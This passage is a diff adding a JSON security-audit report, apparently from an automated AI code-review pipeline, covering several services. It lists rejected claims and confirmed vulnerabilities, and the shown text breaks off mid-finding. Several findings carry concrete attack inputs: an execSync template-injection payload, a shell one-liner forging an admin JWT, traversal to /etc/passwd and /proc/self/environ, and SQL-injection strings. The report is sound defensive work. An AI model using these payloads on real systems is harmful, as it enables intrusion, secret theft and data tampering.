@@ -1,0 +1,1434 @@
+{
+  "provenance": {
+    "corpus": "google/mantis @ 56377ad via mantis-meta-agent",
+    "target": "/private/tmp/claude-501/-Users-cristianajavi/9d781ed3-bcf0-48ee-982b-aa1d8b6fbd34/scratchpad/corpus-v5",
+    "arm": "mantis",
+    "run": 1,
+    "stages_run": [
+      "mantis-meta-agent",
+      "mantis-structural-index",
+      "mantis-summarize",
+      "mantis-architecture",
+      "mantis-threat-model",
+      "mantis-plan",
+      "mantis-researcher",
+      "mantis-dedupe",
+      "mantis-review",
+      "mantis-critic",
+      "mantis-chain",
+      "mantis-calibrate",
+      "mantis-reflect",
+      "mantis-report"
+    ],
+    "stages_skipped": [
+      "mantis-history: the target tree contains no VCS metadata (no .git/.hg/.repo under corpus-v5), so there is no history to mine for past fixes; per the Block A step-5 carve-out this is not a reason to stop, so the pass continued without historical_learnings.jsonl.",
+      "mantis-reproduce: no runtime available offline - `go`, `docker` and the Python/Node service dependencies (pg, fastify, starlette, flask, bullmq, aws-cdk-lib) are all absent, and the stage's tiered strategy requires an isolated sandbox plus live services. All findings are therefore statically confirmed only; none carry an executed PoC.",
+      "mantis-patch: the task forbids modifying anything under TARGET, and the stage writes fixes plus post-patch validation runs into the tree. Skipped rather than run read-only, so no finding carries patch_status or reattack_status.",
+      "snapshot pinning (meta-agent Blocks C/D): run without --sync, which is the documented default. All stages executed in MODE-OFF against the live tree as a single static snapshot; discovery_commit is unset and the Snapshot Provenance Gate did not apply.",
+      "sub-agent delegation: the harness caps concurrency, so all stages were run inline and sequentially by the orchestrating agent, which is the sequential fallback the suite documents for non-parallel hosts."
+    ],
+    "ruled_out": [
+      {
+        "assertion": "SQL injection via the account_id interpolated into the balance query with an f-string",
+        "location": "ledger-flow/blueprints/api.py:64",
+        "rule": "FP-12",
+        "killed_by": "The route converter is <int:account_id> (api.py:56), so Flask has already coerced the value to a Python int before the f-string runs; a non-integer path segment 404s at routing time. The injectable-looking text at that line cannot receive a non-numeric value, so the claim is not coherent with the surrounding code."
+      },
+      {
+        "assertion": "SQL injection via the LIMIT clause of listNotifications",
+        "location": "pulse-notify/lib/store.js:43",
+        "rule": "FP-09",
+        "killed_by": "The only caller (routes/notifications.js:32-34) attaches listSchema, whose limit property is {type:'integer', minimum:1, maximum:200, default:50} with additionalProperties:false. Fastify's ajv coerces and rejects before the handler runs, so the interpolated value is always an integer in range. Accepting a working mitigation as working."
+      },
+      {
+        "assertion": "SQL injection via the LIMIT clause of ListDevices",
+        "location": "atlas-sync/store/queries.go:90",
+        "rule": "FP-09",
+        "killed_by": "handlers/device.go:38-45 parses the query parameter with strconv.Atoi, bounds it to 1..500, and passes strconv.Itoa(limit) - a value that provably cannot contain non-digits. The fmt.Sprintf is ugly but not reachable with injectable content."
+      },
+      {
+        "assertion": "TLS certificate verification disabled in the billing HTTP client (InsecureSkipVerify)",
+        "location": "atlas-sync/main.go:33",
+        "rule": "FP-03",
+        "killed_by": "The guard is `if Env == \"sandbox\"` where Env is `const Env = \"production\"` (main.go:24). The branch is a compile-time constant false; Go eliminates it and no build tag in this tree redefines the constant. Not triggerable in the reviewed code."
+      },
+      {
+        "assertion": "Double mac.Sum(nil) call corrupts the billing webhook HMAC comparison",
+        "location": "atlas-sync/handlers/webhook.go:63",
+        "rule": "FP-12",
+        "killed_by": "hash.Hash.Sum appends the digest to its argument without mutating the internal state, so the second Sum(nil) at line 63 returns exactly the bytes hex-encoded into `want` at line 60. The comparison is correct, uses hmac.Equal (constant time), and is preceded by a real timestamp-tolerance check. The suspicious-looking `_ = want` is dead code, not a bug."
+      },
+      {
+        "assertion": "Reflected XSS in the provider troubleshooting echo handler",
+        "location": "atlas-sync/handlers/webhook.go:86",
+        "rule": "FP-01",
+        "killed_by": "echoEvent writes the raw request body into an HTML response, but it is never registered on any route - router.go references only Health, Webhook.Billing, Device.* and Sync.*, and no build tag or alternate router exists in this tree. Reaching it requires a caller that does not exist."
+      },
+      {
+        "assertion": "Path traversal in the ledger import via the client-supplied file name",
+        "location": "ledger-flow/services/importer.py:27",
+        "rule": "FP-09",
+        "killed_by": "_staged_path resolves with os.path.realpath and then requires the result to start with os.path.realpath(root) + os.sep before any open, which correctly defeats '..' segments, absolute paths and symlink escapes. The mitigation works; inventing a bypass around it is exactly what FP-09 forbids."
+      },
+      {
+        "assertion": "Command injection through the iconv transcode step",
+        "location": "ledger-flow/services/importer.py:44",
+        "rule": "FP-09",
+        "killed_by": "subprocess.run is called with an argument LIST (no shell=True), the binary path is absolute and fixed, and the -f value comes from ENCODINGS.get(encoding), a three-entry dict lookup that raises ValueError on anything else (importer.py:37-39). No argument is attacker-controlled."
+      },
+      {
+        "assertion": "Non-constant-time digest comparison in _compare_legacy_digest",
+        "location": "ledger-flow/auth.py:100",
+        "rule": "FP-01",
+        "killed_by": "The function's own docstring records that 'the migration removed the last caller', and a grep confirms no call site anywhere in ledger-flow. A timing side channel with no caller has no measurable channel; exploiting it would require a hypothetical future caller."
+      },
+      {
+        "assertion": "Response splitting / header injection via the tenant name in the CSV Content-Disposition header",
+        "location": "ledger-flow/blueprints/reports.py:85",
+        "rule": "FP-04",
+        "killed_by": "Werkzeug rejects header values containing CR/LF before they reach the socket, so the splitting half is blocked by the framework. What remains - a quote in the filename parameter - is cosmetic. Flagging it would be the pedantic-linting case FP-04 excludes."
+      },
+      {
+        "assertion": "Hardcoded Redis password default in the queue connection",
+        "location": "orchard-jobs/src/queue/index.js:8",
+        "rule": "FP-02",
+        "killed_by": "'orchard-local-dev' is a development fallback for a local container, in the same shape FP-02 exempts (hardcoded mock/dev backing store). It grants nothing: against a real Redis the wrong password fails closed, and REDIS_PASSWORD overrides it in every deployed configuration."
+      },
+      {
+        "assertion": "Hardcoded API key and account number in the environments module",
+        "location": "beacon-cdk/config/environments.ts:79",
+        "rule": "FP-02",
+        "killed_by": "The `docs` object is annotated 'Values shown in the onboarding guide; not read by any stack', 'beacon-example-key-shown-in-docs' is self-describing, and a grep confirms nothing imports `docs`. Documentation sample values, which FP-02 excludes."
+      },
+      {
+        "assertion": "Hardcoded demo token in the notification service configuration",
+        "location": "pulse-notify/config/default.json:31",
+        "rule": "FP-02",
+        "killed_by": "'pulse-sample-token-for-docs' lives under config.defaults alongside sender/replyTo addresses and is never compared against a credential - plugins/auth.js hashes the presented bearer token and looks it up in the sessions table instead. It is documentation filler, not a live secret."
+      },
+      {
+        "assertion": "Wildcard admin policy statement grants '*' on '*'",
+        "location": "beacon-cdk/lib/constructs/service-role.ts:79",
+        "rule": "FP-01",
+        "killed_by": "adminPolicyStatement() is an exported factory with no call site in the repository - no stack, construct or bin entry imports it. It creates a PolicyStatement object; nothing attaches it to a principal, so no privilege is actually granted. (The genuine admin-privilege exposure in this stack is reported separately via tierPolicies.ops.)"
+      },
+      {
+        "assertion": "Upstream TLS verification disabled by proxy_ssl_verify off",
+        "location": "edge-relay/nginx/upstreams.conf:17",
+        "rule": "FP-03",
+        "killed_by": "The directive applies only to https:// upstreams. Every proxy_pass in relay.conf targets http://relay_app (lines 30, 43, 48, 57), and relay_thumbs has no proxy_pass at all, so no TLS connection is made from this configuration and the setting cannot weaken one. The stale comment at lines 15-16 confirms it is a leftover."
+      },
+      {
+        "assertion": "XSS in the unsubscribe landing page via the reference token",
+        "location": "edge-relay/app/routes_public.py:69",
+        "rule": "FP-09",
+        "killed_by": "The token is injected into element text content inside <p>, where escaping '<' and '>' is sufficient to prevent tag introduction; no attribute or script context is reachable, so unescaped quotes are inert. The mitigation is adequate for the context it guards."
+      },
+      {
+        "assertion": "Path traversal in the marketing landing page loader",
+        "location": "edge-relay/app/routes_public.py:57",
+        "rule": "FP-09",
+        "killed_by": "safe_slug (deps.py:72-75) requires a full match of ^[a-z0-9][a-z0-9-]{0,63}$ before the path is built, which admits no '/', '.' or '..'. The join is confined by construction."
+      },
+      {
+        "assertion": "Password hash exposed by the profile endpoint",
+        "location": "atlas-sync/store/queries.go:61",
+        "rule": "FP-12",
+        "killed_by": "User.PasswordHash carries the struct tag `json:\"-\"` (queries.go:28) so it is never serialised, and FindUserByID additionally selects the literal '' into that column. Two independent reasons the claim does not hold at the cited line."
+      }
+    ]
+  },
+  "findings": [
+    {
+      "title": "Admin router is mounted outside the authenticated scope, leaving /admin/* unauthenticated",
+      "location": {
+        "path": "pulse-notify/server.js",
+        "symbol": "build",
+        "line": 38
+      },
+      "class": "Missing authentication",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "server.js registers the session hook only inside the apiScope plugin scoped to prefix '/api/v1' (lines 27-34). adminRoutes is registered as a sibling at the root instance with prefix '/admin' (line 38), so no onRequest auth hook is in its chain. routes/admin.js:6-8 states 'The session hook populates request.user with the operator's identity before any of these handlers run', and the handlers act accordingly: DELETE /admin/tenants/:id (admin.js:14) calls store.deleteTenant with no check, and admin.js:15 reads request.user defensively ('system' fallback), confirming request.user can be absent. fastify.requireRole (plugins/auth.js:58) is never called by any admin handler.",
+      "impact": "Any unauthenticated internet caller can enumerate tenants' notifications (GET /admin/tenants/:id/notifications), permanently destroy a tenant's data (DELETE /admin/tenants/:id -> DELETE FROM notifications / DELETE FROM tenants), read operational config including config.defaults (GET /admin/config), and probe the session table (POST /admin/sessions/impersonate).",
+      "recommendation": "Register the auth plugin on the root instance (wrapped with fastify-plugin) or add an explicit onRequest/preHandler guard plus fastify.requireRole('operator') to every route in routes/admin.js.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not a missing-header/defence-in-depth nit: authentication is entirely absent on a destructive production route, not merely weak."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Path is routes/admin.js, a first-class production router mounted in build(); it is not test/mock code."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "server.js:38 and routes/admin.js:14 verified to exist verbatim at those lines."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress is the HTTP request line itself (request.params.id on an unauthenticated route); no trusted-origin claim applies."
+        }
+      ]
+    },
+    {
+      "title": "SQL injection through attacker-controlled column names in searchNotifications",
+      "location": {
+        "path": "pulse-notify/lib/store.js",
+        "symbol": "searchNotifications",
+        "line": 52
+      },
+      "class": "SQL injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "store.js:51-53 builds predicates as `${column} = ${quote(value)}` from Object.entries(filter). Only the VALUE passes through quote() (store.js:19-21); the COLUMN half is interpolated raw. The filter object arrives from POST /api/v1/notifications/search (routes/notifications.js:47-49) whose schema (notifications.js:22-25) constrains only the property values ('additionalProperties': {'type':'string'}), never the property NAMES. A body such as {\"filter\":{\"1=1 OR tenant_id\":\"x\"}} injects directly into the WHERE clause. The same sink is reached again from routes/admin.js:11.",
+      "impact": "Full read of the notifications table across every tenant, and, via UNION/subselect in the ORDER BY-free WHERE clause, arbitrary data extraction from any table the pg role can read (including the sessions table used for authentication).",
+      "recommendation": "Reject unknown filter keys against an explicit allowlist of column names and bind values with $n placeholders; never concatenate identifiers.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is precisely NOT the safe parameterised path: the identifier is string-concatenated while the neighbouring queries in the same file correctly use $1/$2."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "store.js:50-63 and notifications.js:47-49 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.body.filter at pulse-notify/routes/notifications.js:48, an HTTP request body."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "quote() is a real mitigation but covers only the value; it is not stretched into a claimed bypass, the column path is simply unprotected."
+        }
+      ]
+    },
+    {
+      "title": "Remote code execution via new Function() in the moustache template renderer",
+      "location": {
+        "path": "pulse-notify/lib/render.js",
+        "symbol": "renderTemplate",
+        "line": 28
+      },
+      "class": "Code injection / RCE",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "render.js:25-33 matches `{{= expr }}` and evaluates it with `new Function(...keys, 'return (' + body + ');')`. `body` is a raw slice of the template string. routes/notifications.js:58-61 passes request.body.template straight in: `render.renderTemplate(String(template || ''), variables || {})`. A template of `{{= process.mainModule.require('child_process').execSync('id') }}` executes in the API process. escapeHtml is applied to the RESULT, which does not constrain what the expression did.",
+      "impact": "Arbitrary code execution as the API process: read DATABASE_URL and PULSE_WEBHOOK_SECRET from process.env, pivot to the database, or take over the host.",
+      "recommendation": "Delete the `{{= }}` expression branch, or evaluate templates in a sandboxed expression evaluator with an explicit operator/identifier allowlist. Never build Function objects from request data.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No hypothetical caller is required: the shipped route notifications.js:58 feeds request.body.template into the sink directly."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Deterministic, single-request trigger; no timing or environmental fragility."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Direct injection path in the function's own logic; valid regardless of callers, and a caller exists."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "render.js:28 and notifications.js:60 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.body.template at pulse-notify/routes/notifications.js:59."
+        }
+      ]
+    },
+    {
+      "title": "Provider webhook signature is verified only when the caller chooses to send one",
+      "location": {
+        "path": "pulse-notify/routes/webhooks.js",
+        "symbol": "deliveries handler",
+        "line": 44
+      },
+      "class": "Authentication bypass",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "webhooks.js:44 wraps the entire timestamp + HMAC check in `if (header)`, where header is the attacker-supplied `x-pulse-signature` request header (line 39). Omitting the header skips both the replay window and signatureMatches() and falls through to the ingest loop at lines 56-59. The comment on lines 42-43 documents the intent ('only enforce the signature once the provider starts sending one').",
+      "impact": "Any unauthenticated caller can POST forged delivery receipts to /hooks/deliveries and overwrite the status of arbitrary provider_id rows (store.recordDelivery uses ON CONFLICT DO UPDATE), corrupting delivery accounting and masking failed sends.",
+      "recommendation": "Require the signature header unconditionally; reject with 401 when it is absent. If a migration window is genuinely needed, gate it on a per-provider server-side flag, never on a client-controlled header.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not a missing hygiene header: the verification code exists and is deliberately bypassable by the attacker."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The mitigation is real when it runs; the finding is that the attacker decides whether it runs."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "webhooks.js:38-54 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.headers[config.webhook.header] at pulse-notify/routes/webhooks.js:39."
+        }
+      ]
+    },
+    {
+      "title": "Public-path prefix matching exposes /notifications/public-digest/:tenantId for any tenant",
+      "location": {
+        "path": "pulse-notify/plugins/auth.js",
+        "symbol": "isPublicPath",
+        "line": 15
+      },
+      "class": "Broken access control / IDOR",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "auth.js:13-16 declares a path public when `pathname.startsWith(prefix)` for any entry in config.publicPrefixes, which contains '/api/v1/notifications/public' (config/default.json:13). '/api/v1/notifications/public-digest/<tenant>' satisfies that prefix, so the route at routes/notifications.js:53-56 answers with no bearer token. The handler passes request.params.tenantId straight to store.publicDigest (store.js:73-83), which returns id, subject, RECIPIENT and status for the newest 25 notifications of whatever tenant is named.",
+      "impact": "Unauthenticated cross-tenant disclosure of recipient e-mail addresses/phone numbers and message subjects by enumerating tenant identifiers.",
+      "recommendation": "Match public paths on exact segment boundaries (pathname === prefix || pathname.startsWith(prefix + '/')) and require a per-digest capability token bound to the recipient instead of a bare tenant id.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is a live PII disclosure, not a missing security header."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Production route registered inside the /api/v1 scope."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "auth.js:13-16, config/default.json:11-14 and notifications.js:53-56 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.params.tenantId at pulse-notify/routes/notifications.js:54."
+        }
+      ]
+    },
+    {
+      "title": "Auth and rate-limit plugins are registered without fastify-plugin, so their hooks never run for the route scope",
+      "location": {
+        "path": "pulse-notify/server.js",
+        "symbol": "apiScope",
+        "line": 29
+      },
+      "class": "Missing authentication",
+      "severity": "medium",
+      "status": "probable",
+      "evidence": "plugins/auth.js and plugins/ratelimit.js export bare async functions; neither file imports fastify-plugin (grep for 'fastify-plugin' across pulse-notify returns nothing). server.js:29-31 calls scope.register(authPlugin), scope.register(rateLimitPlugin) and scope.register(notificationRoutes) as three SIBLING children of apiScope. Fastify encapsulates hooks and decorators added inside a register() callback to that child context and its descendants only, so the onRequest hook at auth.js:40 and the decorateRequest('user') at auth.js:38 do not apply to notificationRoutes. Routes that do not touch request.user - POST /notifications/search, POST /notifications/preview, GET /notifications/public-digest/:tenantId - therefore answer without any token; routes that do touch it (lines 34, 38) would instead fault on undefined.",
+      "impact": "Turns the SQL-injection sink (POST /api/v1/notifications/search) and the new Function() RCE sink (POST /api/v1/notifications/preview) into pre-authentication attack surface, and disables the fixed-window rate limiter on the same paths.",
+      "recommendation": "Wrap both plugins with fastify-plugin so their hooks and decorators break out of the encapsulation context, and add an integration test asserting a 401 on /api/v1/notifications/search with no Authorization header.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The claim is about the shipped wiring in server.js, not about a hypothetical caller misusing the plugin."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "Encapsulation semantics are stable across Fastify v1-v5, but no package.json pins the version in this corpus and no runtime was available offline to execute the 401 check."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "server.js:27-34, plugins/auth.js:37-56 and plugins/ratelimit.js:28-52 verified verbatim; absence of fastify-plugin confirmed by grep."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress is the unauthenticated HTTP request to /api/v1/notifications/*."
+        }
+      ]
+    },
+    {
+      "title": "Rate-limit allowlist is evaluated against a spoofable client address",
+      "location": {
+        "path": "pulse-notify/plugins/ratelimit.js",
+        "symbol": "rateLimitPlugin",
+        "line": 34
+      },
+      "class": "Rate-limit bypass / IP spoofing",
+      "severity": "low",
+      "status": "probable",
+      "evidence": "server.js:16 sets trustProxy to ['10.0.0.0/8','172.16.0.0/12']. proxy-addr walks the X-Forwarded-For chain right-to-left and stops at the first UNTRUSTED hop; when every entry in the chain is inside the trusted CIDRs it returns the left-most, attacker-supplied value. ratelimit.js:33-34 then tests that value against config.rateLimit.allowList, which contains '127.0.0.1' and '10.42.0.0/16' (config/default.json:18). A request through the edge carrying `X-Forwarded-For: 10.42.0.1` is allow-listed and skips the counter entirely; the same value is what request.ip reports to the logger.",
+      "impact": "Unlimited request volume against the authentication and search endpoints (credential stuffing, SQL-injection probing) plus falsified source addresses in the request log.",
+      "recommendation": "Key the limiter on the authenticated principal only, and derive the allowlist decision from the immediate socket address (request.socket.remoteAddress) rather than the forwarded chain.",
+      "triage": [
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "FP-07 exempts modules whose primary stated purpose is abuse defence; ratelimit.js:26-27 states exactly that, so the constraint does not fire."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "server.js:16, ratelimit.js:32-34 and config/default.json:15-19 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: the X-Forwarded-For request header consumed by Fastify's trustProxy handling at pulse-notify/server.js:16."
+        }
+      ]
+    },
+    {
+      "title": "Unsigned-JWT fallback: RequireSession accepts any token whose payload merely parses",
+      "location": {
+        "path": "atlas-sync/middleware/auth.go",
+        "symbol": "RequireSession",
+        "line": 56
+      },
+      "class": "Authentication bypass / privilege escalation",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "token.ParseLegacy (internal/token/token.go:67-87) splits the token on '.', base64url-decodes ONLY parts[1] and json.Unmarshal's it into Claims. It never touches parts[2] and never uses v.secret - there is no signature verification of any kind. middleware/auth.go:51-61 calls it as the fallback for every token that fails the real verifier: if v.Parse(raw) errors for ANY reason (bad signature included), the code falls through to ParseLegacy and, on success, populates Scope.UserID/TenantID/Role from the unverified payload (auth.go:63-68).",
+      "impact": "Complete authentication bypass. `printf 'x.%s.y' $(echo -n '{\"sub\":\"<victim>\",\"tid\":\"<any-tenant>\",\"role\":\"admin\",\"exp\":9999999999}' | basenc --base64url -w0 | tr -d '=')` yields a bearer token accepted by every /v1/* route, with attacker-chosen user, tenant and role. RequireRole (auth.go:76-86) compares that same forged Role, so operator gating is bypassed too.",
+      "recommendation": "Delete ParseLegacy and the fallback. If legacy envelopes must be honoured, verify their signature with the same secret and gate the fallback behind a dated, per-token-issuer flag.",
+      "triage": [
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Single deterministic request; the forged token is trivially constructed offline."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not a bypass invented around a working mitigation; the fallback path performs no verification at all."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Intrinsically broken authentication primitive, and it has a live caller."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "auth.go:51-61 and token.go:67-87 verified verbatim; ParseLegacy contains no reference to v.secret or jwt.Parse."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: the Authorization header read at atlas-sync/middleware/auth.go:33."
+        }
+      ]
+    },
+    {
+      "title": "The /v1/sync route group is registered without RequireSession",
+      "location": {
+        "path": "atlas-sync/router.go",
+        "symbol": "NewRouter",
+        "line": 53
+      },
+      "class": "Missing authentication",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The authenticated endpoints live in r.Group at router.go:40-49, which applies middleware.RequireSession and PerUserRateLimit. /v1/sync is instead declared with r.Route at line 53 and receives only chimw.Timeout and middleware.MaxBytes (lines 54-55). chi's Route creates a fresh sub-router that inherits only the root-level r.Use middlewares (RequestID, RealIP, Recoverer, SecurityHeaders, Timeout - lines 27-31), none of which authenticate. Delta, Push and Attachment (lines 57-59) are therefore anonymous, and handlers/sync.go:39-44 makes that exploitable: resolveDevice falls back to the `device_id` QUERY PARAMETER whenever the request scope carries no DeviceID, which for an anonymous request is always.",
+      "impact": "Unauthenticated read of any device's synchronised records (GET /v1/sync/delta?device_id=<victim>, up to 5000 rows of body content per call) and unauthenticated write into any device's account (POST /v1/sync/push?device_id=<victim>, which resolves the owner server-side via OwnerOfDevice and upserts under that owner).",
+      "recommendation": "Move the /v1/sync sub-router inside the authenticated group (or add sr.Use(middleware.RequireSession(deps.Tokens))) and drop the query-string device_id fallback in favour of the token's DeviceID.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Authentication is absent on a production data-plane route, not a missing hardening header."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "router.go is the production router assembled in main.go:70."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "router.go:40-60 and handlers/sync.go:39-44 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: r.URL.Query().Get(\"device_id\") at atlas-sync/handlers/sync.go:43."
+        }
+      ]
+    },
+    {
+      "title": "Path traversal in the attachment download handler",
+      "location": {
+        "path": "atlas-sync/handlers/sync.go",
+        "symbol": "SyncHandler.Attachment",
+        "line": 134
+      },
+      "class": "Path traversal",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The `name` query parameter (sync.go:128) is joined onto h.attachDir with no validation: os.Open(filepath.Join(h.attachDir, name)). filepath.Join lexically cleans the result but does NOT confine it to the base directory, so '../' segments escape. The comment at lines 125-126 asserts the names are 'opaque identifiers generated by the client SDK', which is a client-side assumption. The route (router.go:59) additionally carries no session middleware.",
+      "impact": "Unauthenticated read of any file the service account can open: GET /v1/sync/attachment?name=../../../../etc/passwd, ../../proc/self/environ (which yields ATLAS_JWT_SECRET and ATLAS_DATABASE_URL), or other tenants' attachment blobs.",
+      "recommendation": "Reject any name that is not a bare base name (reject filepath.Separator, '..' and absolute paths), then verify the resolved path still has the attachment root as a prefix after filepath.EvalSymlinks; serve with http.ServeContent from an os.Root/openat2-confined handle.",
+      "triage": [
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "One deterministic GET; nothing fragile about it."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "NOT_APPLICABLE",
+          "reason": "There is no mitigation present to evaluate - no sanitisation, containment check or allowlist exists on this path."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "handlers/sync.go:127-144 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: r.URL.Query().Get(\"name\") at atlas-sync/handlers/sync.go:128."
+        }
+      ]
+    },
+    {
+      "title": "SQL injection through the ORDER BY column of the activity feed",
+      "location": {
+        "path": "atlas-sync/store/queries.go",
+        "symbol": "Repo.ListRecords",
+        "line": 167
+      },
+      "class": "SQL injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "queries.go:162-168 builds the statement with fmt.Sprintf and interpolates sortColumn directly into `ORDER BY %s DESC`. The value originates at handlers/sync.go:113 as r.URL.Query().Get(\"sort\") and is forwarded unvalidated at sync.go:117. Only ownerID is bound as $1. PostgreSQL permits arbitrary expressions and scalar subqueries in ORDER BY, so `?sort=(SELECT password_hash FROM users LIMIT 1)` or a CASE/pg_sleep predicate turns the sort key into a boolean/time oracle.",
+      "impact": "Blind extraction of any table the atlas role can read, including users.password_hash, from an endpoint reachable with a forged legacy token (see the ParseLegacy finding).",
+      "recommendation": "Map the query parameter onto a fixed allowlist of column names ('updated_at','kind','created_at') and reject anything else; never interpolate identifiers.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not paranoia about a safe API: this query abandons placeholders for the sort key while binding ownerID correctly one line above."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "queries.go:162-168 and handlers/sync.go:111-117 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: r.URL.Query().Get(\"sort\") at atlas-sync/handlers/sync.go:113."
+        }
+      ]
+    },
+    {
+      "title": "Backup import trusts the client-supplied owner_id and upserts across ownership boundaries",
+      "location": {
+        "path": "atlas-sync/handlers/device.go",
+        "symbol": "DeviceHandler.Import",
+        "line": 91
+      },
+      "class": "Broken access control / data tampering",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "POST /v1/devices/import decodes []store.Record from the request body (device.go:82-86) and hands it straight to BulkInsertRecords (device.go:91). Record carries OwnerID as a wire field (store/queries.go:40-47) and queries.go:138 inserts rec.OwnerID verbatim. The Import handler never reads middleware.ScopeFrom, so the caller's own identity is never consulted. Compare UpsertRecord (queries.go:109-118), which deliberately guards the conflict branch with `WHERE records.owner_id = $2`; BulkInsertRecords' ON CONFLICT (id) DO UPDATE (queries.go:130-131) has no such guard.",
+      "impact": "Any authenticated user can plant records into any other account (owner_id of their choosing) and, by reusing a known record id, silently overwrite the body of another tenant's existing record - integrity loss and a phishing/content-injection vector into the victim's activity feed.",
+      "recommendation": "Ignore the wire OwnerID and stamp middleware.ScopeFrom(r.Context()).UserID on every imported record; add `WHERE records.owner_id = EXCLUDED.owner_id` (or the equivalent ownership predicate) to the bulk statement's conflict branch.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The unsafe caller is the shipped handler at device.go:81-96, not a hypothetical one."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Route is registered in the production router at router.go:47."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "device.go:75-96 and store/queries.go:120-143 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: json.NewDecoder(r.Body).Decode(&body) at atlas-sync/handlers/device.go:83, whose Records[i].OwnerID reaches the INSERT at store/queries.go:138."
+        }
+      ]
+    },
+    {
+      "title": "Edge ACL guards /internal/ while the operator console is mounted at /ops, leaving it internet-reachable",
+      "location": {
+        "path": "edge-relay/nginx/relay.conf",
+        "symbol": "location /internal/",
+        "line": 25
+      },
+      "class": "Broken access control",
+      "severity": "high",
+      "status": "confirmed",
